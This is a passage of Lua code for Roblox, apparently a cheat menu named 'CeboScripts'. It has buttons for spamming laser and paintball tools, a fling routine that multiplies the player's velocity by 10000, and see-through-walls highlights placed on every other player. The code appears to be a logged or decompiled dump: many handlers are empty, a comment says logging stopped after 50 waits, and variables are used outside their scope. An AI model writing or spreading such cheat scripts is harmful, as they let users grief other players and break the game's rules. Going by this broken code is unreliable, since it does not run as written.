	local tween49 = TweenService:Create(UIScale3, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Scale = 0.88 })
	tween49:Play()

	task.delay(0.1, function()
	end)

	TextButton47:GetChildren()
	UIGradient39:Destroy()
	local UIGradient47 = Instance.new("UIGradient")
	UIGradient47.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 210, 216)) })
	UIGradient47.Rotation = 135
	UIGradient47.Parent = TextButton47
	local tween50 = TweenService:Create(UIStroke75, TweenInfo.new(0.1), { Color = Color3.fromRGB(160, 50, 50) })
	tween50:Play()

	task.delay(0.15, function()
	end)

	local tween51 = TweenService:Create(Frame49, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween51:Play()
	local tween52 = TweenService:Create(Frame50, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween52:Play()

	local connection4 = RunService.Stepped:Connect(function(time, deltaTime9)
	end)

	task.spawn(function()
		RunService.Heartbeat:Wait()
		local HumanoidRootPart2 = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		local lastHumanoidRootPart = HumanoidRootPart2

		for _ = 1, 4 do
			local previousHumanoidRootPart = lastHumanoidRootPart
			previousHumanoidRootPart.Velocity = ((previousHumanoidRootPart.Velocity * 10000) + Vector3.new(0, 10000, 0))
			RunService.RenderStepped:Wait()
			previousHumanoidRootPart.Velocity = previousHumanoidRootPart.Velocity
			RunService.Stepped:Wait()
			previousHumanoidRootPart.Velocity = (previousHumanoidRootPart.Velocity + Vector3.new(0, 0.10000000149011612, 0))
			RunService.Heartbeat:Wait()
			local HumanoidRootPart3 = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
			HumanoidRootPart3.Velocity = ((HumanoidRootPart3.Velocity * 10000) + Vector3.new(0, 10000, 0))
			RunService.RenderStepped:Wait()
			HumanoidRootPart3.Velocity = HumanoidRootPart3.Velocity
			RunService.Stepped:Wait()
			HumanoidRootPart3.Velocity = (HumanoidRootPart3.Velocity + Vector3.new(0, 0.10000000149011612, 0))
			RunService.Heartbeat:Wait()
			local HumanoidRootPart4 = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
			HumanoidRootPart4.Velocity = ((HumanoidRootPart4.Velocity * 10000) + Vector3.new(0, 10000, 0))
			RunService.RenderStepped:Wait()
			HumanoidRootPart4.Velocity = HumanoidRootPart4.Velocity
			RunService.Stepped:Wait()
			HumanoidRootPart4.Velocity = (HumanoidRootPart4.Velocity + Vector3.new(0, 0.10000000149011612, 0))
			RunService.Heartbeat:Wait()
			local HumanoidRootPart5 = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
			HumanoidRootPart5.Velocity = ((HumanoidRootPart5.Velocity * 10000) + Vector3.new(0, 10000, 0))
			RunService.RenderStepped:Wait()
			HumanoidRootPart5.Velocity = HumanoidRootPart5.Velocity
			RunService.Stepped:Wait()
			HumanoidRootPart5.Velocity = (HumanoidRootPart5.Velocity + Vector3.new(0, 0.10000000149011612, 0))
			RunService.Heartbeat:Wait()
			local HumanoidRootPart6 = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
			lastHumanoidRootPart = HumanoidRootPart6
		end

		lastHumanoidRootPart.Velocity = ((lastHumanoidRootPart.Velocity * 10000) + Vector3.new(0, 10000, 0))
		RunService.RenderStepped:Wait()
		lastHumanoidRootPart.Velocity = lastHumanoidRootPart.Velocity
		RunService.Stepped:Wait()
		-- [envlog] stopped after 50 waits
	end)
end)

local SPAMLASER = Instance.new("Frame", MobileButtons)
SPAMLASER.Name = "SPAMLASER"
SPAMLASER.Size = UDim2.new(0, 102, 0, 48)
SPAMLASER.Position = UDim2.new(1, -122, 0.32, 56)
SPAMLASER.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SPAMLASER.BorderSizePixel = 0
SPAMLASER.Active = true
SPAMLASER.ZIndex = 200
local UICorner104 = Instance.new("UICorner", SPAMLASER)
UICorner104.CornerRadius = UDim.new(0, 11)
SPAMLASER:GetChildren()
local UIGradient40 = Instance.new("UIGradient")
UIGradient40.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient40.Rotation = 110
UIGradient40.Parent = SPAMLASER
local UIStroke76 = Instance.new("UIStroke", SPAMLASER)
UIStroke76.Color = Color3.fromRGB(100, 35, 35)
UIStroke76.Thickness = 1.2
local TextButton48 = Instance.new("TextButton", SPAMLASER)
TextButton48.Size = UDim2.new(1, -4, 1, -4)
TextButton48.Position = UDim2.new(0, 2, 0, 2)
TextButton48.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton48.Text = "SPAM LASER"
TextButton48.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton48.Font = Enum.Font.GothamBlack
TextButton48.TextSize = 9
TextButton48.TextWrapped = true
TextButton48.BorderSizePixel = 0
TextButton48.AutoButtonColor = false
TextButton48.ZIndex = 202
local UICorner105 = Instance.new("UICorner", TextButton48)
UICorner105.CornerRadius = UDim.new(0, 8)
TextButton48:GetChildren()
local UIGradient41 = Instance.new("UIGradient")
UIGradient41.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 120, 130)), ColorSequenceKeypoint.new(1, Color3.fromRGB(235, 70, 80)) })
UIGradient41.Rotation = 135
UIGradient41.Parent = TextButton48
local UIScale4 = Instance.new("UIScale")
UIScale4.Scale = 1
UIScale4.Parent = SPAMLASER

SPAMLASER.InputBegan:Connect(function(input17, gameProcessed17)
end)

TextButton48.InputBegan:Connect(function(input18, gameProcessed18)
end)

UserInputService.InputChanged:Connect(function(input19, gameProcessed19)
end)

UserInputService.InputEnded:Connect(function(input20, gameProcessed20)
end)

TextButton48.MouseButton1Click:Connect(function()
	local tween53 = TweenService:Create(UIScale4, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Scale = 0.88 })
	tween53:Play()

	task.delay(0.1, function()
	end)

	TextButton48:GetChildren()
	UIGradient41:Destroy()
	local UIGradient48 = Instance.new("UIGradient")
	UIGradient48.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 210, 216)) })
	UIGradient48.Rotation = 135
	UIGradient48.Parent = TextButton48
	local tween54 = TweenService:Create(UIStroke76, TweenInfo.new(0.1), { Color = Color3.fromRGB(160, 50, 50) })
	tween54:Play()

	task.delay(0.15, function()
	end)

	St.spamLaser = true

	task.spawn(function()
		Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		Players.LocalPlayer.Character:GetDescendants()
		local Backpack4 = Players.LocalPlayer:FindFirstChild("Backpack")
		local descendants2 = Backpack4:GetDescendants()

		for i12, v13 in ipairs(descendants2) do
			v13.Name:gsub("%s+", "")
		end
	end)

	local tween55 = TweenService:Create(Frame55, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween55:Play()
	local tween56 = TweenService:Create(Frame56, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween56:Play()
	local tween57 = TweenService:Create(Frame55, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween57:Play()
	local tween58 = TweenService:Create(Frame56, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween58:Play()
	local tween59 = TweenService:Create(Frame55, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween59:Play()
	local tween60 = TweenService:Create(Frame56, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween60:Play()
	local tween61 = TweenService:Create(Frame55, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween61:Play()
	local tween62 = TweenService:Create(Frame56, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween62:Play()
end)

local SPAMPAITBALL = Instance.new("Frame", MobileButtons)
SPAMPAITBALL.Name = "SPAMPAITBALL"
SPAMPAITBALL.Size = UDim2.new(0, 102, 0, 48)
SPAMPAITBALL.Position = UDim2.new(1, -232, 0.32, 112)
SPAMPAITBALL.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SPAMPAITBALL.BorderSizePixel = 0
SPAMPAITBALL.Active = true
SPAMPAITBALL.ZIndex = 200
local UICorner106 = Instance.new("UICorner", SPAMPAITBALL)
UICorner106.CornerRadius = UDim.new(0, 11)
SPAMPAITBALL:GetChildren()
local UIGradient42 = Instance.new("UIGradient")
UIGradient42.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 5, 5)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 3, 3)), ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 1, 1)) })
UIGradient42.Rotation = 110
UIGradient42.Parent = SPAMPAITBALL
local UIStroke77 = Instance.new("UIStroke", SPAMPAITBALL)
UIStroke77.Color = Color3.fromRGB(100, 35, 35)
UIStroke77.Thickness = 1.2
local TextButton49 = Instance.new("TextButton", SPAMPAITBALL)
TextButton49.Size = UDim2.new(1, -4, 1, -4)
TextButton49.Position = UDim2.new(0, 2, 0, 2)
TextButton49.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton49.Text = "SPAM PAITBALL"
TextButton49.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton49.Font = Enum.Font.GothamBlack
TextButton49.TextSize = 9
TextButton49.TextWrapped = true
TextButton49.BorderSizePixel = 0
TextButton49.AutoButtonColor = false
TextButton49.ZIndex = 202
local UICorner107 = Instance.new("UICorner", TextButton49)
UICorner107.CornerRadius = UDim.new(0, 8)
TextButton49:GetChildren()
local UIGradient43 = Instance.new("UIGradient")
UIGradient43.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 120, 130)), ColorSequenceKeypoint.new(1, Color3.fromRGB(235, 70, 80)) })
UIGradient43.Rotation = 135
UIGradient43.Parent = TextButton49
local UIScale5 = Instance.new("UIScale")
UIScale5.Scale = 1
UIScale5.Parent = SPAMPAITBALL

SPAMPAITBALL.InputBegan:Connect(function(input21, gameProcessed21)
end)

TextButton49.InputBegan:Connect(function(input22, gameProcessed22)
end)

UserInputService.InputChanged:Connect(function(input23, gameProcessed23)
end)

UserInputService.InputEnded:Connect(function(input24, gameProcessed24)
end)

TextButton49.MouseButton1Click:Connect(function()
	local tween63 = TweenService:Create(UIScale5, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Scale = 0.88 })
	tween63:Play()

	task.delay(0.1, function()
	end)

	TextButton49:GetChildren()
	UIGradient43:Destroy()
	local UIGradient49 = Instance.new("UIGradient")
	UIGradient49.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 210, 216)) })
	UIGradient49.Rotation = 135
	UIGradient49.Parent = TextButton49
	local tween64 = TweenService:Create(UIStroke77, TweenInfo.new(0.1), { Color = Color3.fromRGB(160, 50, 50) })
	tween64:Play()

	task.delay(0.15, function()
	end)

	St.spamPaint = true

	task.spawn(function()
		local Humanoid3 = Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		Players.LocalPlayer.Character:GetChildren()
		local children10 = Players.LocalPlayer.Backpack:GetChildren()

		for i13, v14 in ipairs(children10) do
			Humanoid3:UnequipTools()
			task.wait()
			Humanoid3:EquipTool(v14)
		end
	end)

	local tween65 = TweenService:Create(Frame61, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween65:Play()
	local tween66 = TweenService:Create(Frame62, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween66:Play()
	local tween67 = TweenService:Create(Frame61, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(40, 10, 10) })
	tween67:Play()
	local tween68 = TweenService:Create(Frame62, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(1, -16, 0.5, -7) })
	tween68:Play()
end)

INSTAREST.Visible = true
AUTOPOTION.Visible = true
DROP.Visible = true
SPAMLASER.Visible = true
SPAMPAITBALL.Visible = true
MobileButtons.Visible = true

for _, item in ipairs({
	{ textButton = TextButton21, r = 48, g = 22, r2 = 235, g2 = 220 },
	{ textButton = TextButton22, r = 6, g = 1, r2 = 212, g2 = 184 },
	{ textButton = TextButton25, r = 48, g = 22, r2 = 235, g2 = 220 },
	{ textButton = TextButton26, r = 6, g = 1, r2 = 212, g2 = 184 },
	{ textButton = TextButton29, r = 48, g = 22, r2 = 235, g2 = 220 },
	{ textButton = TextButton30, r = 6, g = 1, r2 = 212, g2 = 184 },
	{ textButton = TextButton33, r = 48, g = 22, r2 = 235, g2 = 220 },
	{ textButton = TextButton34, r = 6, g = 1, r2 = 212, g2 = 184 },
	{ textButton = TextButton37, r = 48, g = 22, r2 = 235, g2 = 220 },
	{ textButton = TextButton38, r = 6, g = 1, r2 = 212, g2 = 184 },
}) do
	item.textButton.BackgroundColor3 = Color3.fromRGB(item.r, item.g, item.g)
	item.textButton.TextColor3 = Color3.fromRGB(item.r2, item.g2, item.g2)
end

Frame37.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame38.Position = UDim2.new(0, 2, 0.5, -7)
Frame43.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame44.Position = UDim2.new(0, 2, 0.5, -7)
Frame49.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame50.Position = UDim2.new(0, 2, 0.5, -7)
Frame55.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame56.Position = UDim2.new(0, 2, 0.5, -7)
Frame61.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame62.Position = UDim2.new(0, 2, 0.5, -7)

TextButton20.MouseButton1Click:Connect(function()
	local tween69 = TweenService:Create(Frame37, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(6, 1, 1) })
	tween69:Play()
	local tween70 = TweenService:Create(Frame38, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(0, 2, 0.5, -7) })
	tween70:Play()
end)

TextButton24.MouseButton1Click:Connect(function()
	local tween71 = TweenService:Create(Frame43, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(6, 1, 1) })
	tween71:Play()
	local tween72 = TweenService:Create(Frame44, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(0, 2, 0.5, -7) })
	tween72:Play()
end)

TextButton28.MouseButton1Click:Connect(function()
	connection4:Disconnect()
	local Humanoid4 = Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	Humanoid4.PlatformStand = false
	Humanoid4.Sit = false
	local tween73 = TweenService:Create(Frame49, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(6, 1, 1) })
	tween73:Play()
	local tween74 = TweenService:Create(Frame50, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(0, 2, 0.5, -7) })
	tween74:Play()
end)

TextButton32.MouseButton1Click:Connect(function()
	St.spamLaser = false
	local tween75 = TweenService:Create(Frame55, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(6, 1, 1) })
	tween75:Play()
	local tween76 = TweenService:Create(Frame56, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(0, 2, 0.5, -7) })
	tween76:Play()
	local tween77 = TweenService:Create(Frame55, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(6, 1, 1) })
	tween77:Play()
	local tween78 = TweenService:Create(Frame56, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(0, 2, 0.5, -7) })
	tween78:Play()
	local tween79 = TweenService:Create(Frame55, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(6, 1, 1) })
	tween79:Play()
	local tween80 = TweenService:Create(Frame56, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(0, 2, 0.5, -7) })
	tween80:Play()
	local tween81 = TweenService:Create(Frame55, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(6, 1, 1) })
	tween81:Play()
	local tween82 = TweenService:Create(Frame56, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(0, 2, 0.5, -7) })
	tween82:Play()
end)

TextButton36.MouseButton1Click:Connect(function()
	St.spamPaint = false
	spamConn:Disconnect()
	local tween83 = TweenService:Create(Frame61, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(6, 1, 1) })
	tween83:Play()
	local tween84 = TweenService:Create(Frame62, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(0, 2, 0.5, -7) })
	tween84:Play()
	local tween85 = TweenService:Create(Frame61, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { BackgroundColor3 = Color3.fromRGB(6, 1, 1) })
	tween85:Play()
	local tween86 = TweenService:Create(Frame62, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.new(0, 2, 0.5, -7) })
	tween86:Play()
end)

for _, item in ipairs({
	{ textButton = TextButton21, textButton2 = TextButton22, frame = INSTAREST },
	{ textButton = TextButton22, textButton2 = TextButton21, frame = INSTAREST },
	{ textButton = TextButton25, textButton2 = TextButton26, frame = AUTOPOTION },
	{ textButton = TextButton26, textButton2 = TextButton25, frame = AUTOPOTION },
	{ textButton = TextButton29, textButton2 = TextButton30, frame = DROP },
	{ textButton = TextButton30, textButton2 = TextButton29, frame = DROP },
	{ textButton = TextButton33, textButton2 = TextButton34, frame = SPAMLASER },
	{ textButton = TextButton34, textButton2 = TextButton33, frame = SPAMLASER },
	{ textButton = TextButton37, textButton2 = TextButton38, frame = SPAMPAITBALL },
	{ textButton = TextButton38, textButton2 = TextButton37, frame = SPAMPAITBALL },
}) do
	item.textButton.MouseButton1Click:Connect(function()
		item.textButton.BackgroundColor3 = Color3.fromRGB(48, 22, 22)
		item.textButton.TextColor3 = Color3.fromRGB(235, 220, 220)
		item.textButton2.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
		item.textButton2.TextColor3 = Color3.fromRGB(212, 184, 184)
		item.frame.Visible = false
	end)
end

Frame10.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame11.Position = UDim2.new(0, 2, 0.5, -7)
Frame13.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
Frame14.Position = UDim2.new(1, -16, 0.5, -7)

for _, item in ipairs({
	{ frame = Frame17, frame2 = Frame18 },
	{ frame = Frame40, frame2 = Frame41 },
	{ frame = Frame46, frame2 = Frame47 },
	{ frame = Frame52, frame2 = Frame53 },
	{ frame = Frame58, frame2 = Frame59 },
	{ frame = Frame64, frame2 = Frame65 },
	{ frame = Frame67, frame2 = Frame68 },
	{ frame = Frame70, frame2 = Frame71 },
}) do
	item.frame.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
	item.frame2.Position = UDim2.new(0, 2, 0.5, -7)
end

Frame73.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
Frame74.Position = UDim2.new(1, -16, 0.5, -7)
TextButton44.BackgroundColor3 = Color3.fromRGB(48, 22, 22)
TextButton44.TextColor3 = Color3.fromRGB(235, 220, 220)
TextButton43.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton43.TextColor3 = Color3.fromRGB(212, 184, 184)
Frame55.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame56.Position = UDim2.new(0, 2, 0.5, -7)
Frame61.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame62.Position = UDim2.new(0, 2, 0.5, -7)
Frame22.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
Frame23.Position = UDim2.new(1, -16, 0.5, -7)
Frame25.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame26.Position = UDim2.new(0, 2, 0.5, -7)
Frame34.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame35.Position = UDim2.new(0, 2, 0.5, -7)
Frame28.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame29.Position = UDim2.new(0, 2, 0.5, -7)
Frame31.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame32.Position = UDim2.new(0, 2, 0.5, -7)
TextButton7.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton7.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton8.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton8.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton17.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton17.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton18.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton18.TextColor3 = Color3.fromRGB(212, 184, 184)
Frame22.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
Frame23.Position = UDim2.new(1, -16, 0.5, -7)
Frame25.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
Frame26.Position = UDim2.new(0, 2, 0.5, -7)
TextButton17.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton17.TextColor3 = Color3.fromRGB(212, 184, 184)
TextButton18.BackgroundColor3 = Color3.fromRGB(6, 1, 1)
TextButton18.TextColor3 = Color3.fromRGB(212, 184, 184)

Players.PlayerAdded:Connect(function(player)
	player.CharacterAdded:Connect(function(character7)
		task.wait(0.2)
		local CeboHighlight2 = Instance.new("Highlight")
		CeboHighlight2.Name = "CeboHighlight"
		CeboHighlight2.FillColor = Color3.fromRGB(231, 76, 76)
		CeboHighlight2.OutlineColor = Color3.fromRGB(255, 180, 180)
		CeboHighlight2.FillTransparency = 0.55
		CeboHighlight2.OutlineTransparency = 0
		CeboHighlight2.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
		CeboHighlight2.Enabled = true
		CeboHighlight2.Parent = character7
	end)
end)

local players = Players:GetPlayers()

for i5, v5 in ipairs(players) do
	v5.CharacterAdded:Connect(function(character4)
		task.wait(0.2)
		local CeboHighlight3 = Instance.new("Highlight")
		CeboHighlight3.Name = "CeboHighlight"
		CeboHighlight3.FillColor = Color3.fromRGB(231, 76, 76)
		CeboHighlight3.OutlineColor = Color3.fromRGB(255, 180, 180)
		CeboHighlight3.FillTransparency = 0.55
		CeboHighlight3.OutlineTransparency = 0
		CeboHighlight3.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
		CeboHighlight3.Enabled = true
		CeboHighlight3.Parent = character4
	end)
end

TextButton2.MouseButton1Click:Connect(function()
	Frame5.Visible = false
	Frame8.Visible = true
	TextLabel4.Text = "CeboScripts"
	TextLabel5.Text = "ConfiguraciГіn"
	local tween87 = TweenService:Create(SquircleBorderWrap, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), { Size = UDim2.new(0, 220, 0, 210) })
	tween87:Play()
end)

TextButton5.Activated:Connect(function(inputObject5, clickCount)
	TextButton5:GetChildren()
	UIGradient10:Destroy()
	local UIGradient50 = Instance.new("UIGradient")
	UIGradient50.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 180, 180)) })
	UIGradient50.Rotation = 135
	UIGradient50.Parent = TextButton5

	task.delay(0.15, function()
	end)

	workspace:GetChildren()
	Players.LocalPlayer.Character:GetDescendants()
	local Backpack5 = Players.LocalPlayer:FindFirstChild("Backpack")
	local WebSlinger = Backpack5:FindFirstChild("Web Slinger")
	local descendants3 = WebSlinger:GetDescendants()

	for i14, v15 in ipairs(descendants3) do
		local result = v15.Name:lower()
		result:find("web")
	end

	local WebSlinger2 = Players.LocalPlayer.Character:FindFirstChild("Web Slinger")
	local descendants4 = WebSlinger2:GetDescendants()

	for i15, v16 in ipairs(descendants4) do
		local result2 = v16.Name:lower()
		result2:find("web")
	end

	local players3 = Players:GetPlayers()

	for i16, v17 in ipairs(players3) do
		local descendants5 = v17.Character:GetDescendants()

		for i17, v18 in ipairs(descendants5) do
			local result3 = v18.Name:lower()
			result3:find("web")
		end
	end

	local result4 = v15.Name:lower()
	result4:find("web")
	local result5 = v16.Name:lower()
	result5:find("web")
	local result6 = v18.Name:lower()
	result6:find("web")
end)

TextButton4.MouseButton1Click:Connect(function()
	TextButton4.Text = "[ ... ]"
end)

UserInputService.InputBegan:Connect(function(input25, gameProcessed25)
end)

TextButton.MouseButton1Click:Connect(function()
	local tween88 = TweenService:Create(SquircleBorderWrap, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), { Size = UDim2.new(0, 220, 0, 36) })
	tween88:Play()
	Frame4.Visible = false
	TextButton.Text = "+"
end)

TextButton3.MouseButton1Click:Connect(function()
	workspace:FindFirstChild("CeboCartelPos1")
	CeboCartelPos12:Destroy()
	workspace:FindFirstChild("CeboCartelPos2")
	CeboCartelPos22:Destroy()
	FilthyHubInstaReset:Destroy()
end)

Players.LocalPlayer.CharacterAdded:Connect(function(character5)
	character5:WaitForChild("Humanoid")
	character5:WaitForChild("HumanoidRootPart")
	local HumanoidRootPart19 = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	HumanoidRootPart19.Anchored = false
	HumanoidRootPart19.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
	HumanoidRootPart19.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
	local HumanoidRootPart20 = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	HumanoidRootPart20.Anchored = false
	HumanoidRootPart20.Velocity = Vector3.new(0, HumanoidRootPart20.Velocity.Y, 0)
	HumanoidRootPart20.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
	HumanoidRootPart20.AssemblyAngularVelocity = Vector3.new(0, 0, 0)

	task.spawn(function()
		local HumanoidRootPart21 = character5:WaitForChild("HumanoidRootPart", 5)
		HumanoidRootPart21.Anchored = false
		HumanoidRootPart21.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
		HumanoidRootPart21.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
		local Backpack6 = Players.LocalPlayer:FindFirstChild("Backpack")
		local WebSlinger3 = Players.LocalPlayer.Character:FindFirstChild("Web Slinger")
		WebSlinger3.Parent = Backpack6
		task.wait(0.2)
		local Head3 = character5:FindFirstChild("Head")
		Head3.Transparency = 1
		Head3.CanCollide = false
		local children11 = Head3:GetChildren()

		for i18, v19 in ipairs(children11) do
			v19:Destroy()
		end

		local children12 = Head3:GetChildren()

		for i19, v20 in ipairs(children12) do
		end

		local HeadlessMesh2 = Instance.new("SpecialMesh")
		HeadlessMesh2.MeshType = Enum.MeshType.FileMesh
		HeadlessMesh2.MeshId = "rbxassetid://1095708"
		HeadlessMesh2.Scale = Vector3.new(0.0010000000474974513, 0.0010000000474974513, 0.0010000000474974513)
		HeadlessMesh2.Name = "HeadlessMesh"
		HeadlessMesh2.Parent = Head3
		local changedSignal2 = Head3:GetPropertyChangedSignal("Transparency")

		changedSignal2:Connect(function()
		end)

		Head3.ChildAdded:Connect(function(child13)
		end)

		character5:FindFirstChildOfClass("Humanoid")
	end)

	local Humanoid5 = character5:WaitForChild("Humanoid", 5)

	Humanoid5.Died:Connect(function()
		local HumanoidRootPart22 = Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		HumanoidRootPart22.Anchored = false
		HumanoidRootPart22.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
		HumanoidRootPart22.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
		local Backpack13 = Players.LocalPlayer:FindFirstChild("Backpack")
		local WebSlinger7 = Players.LocalPlayer.Character:FindFirstChild("Web Slinger")
		WebSlinger7.Parent = Backpack13
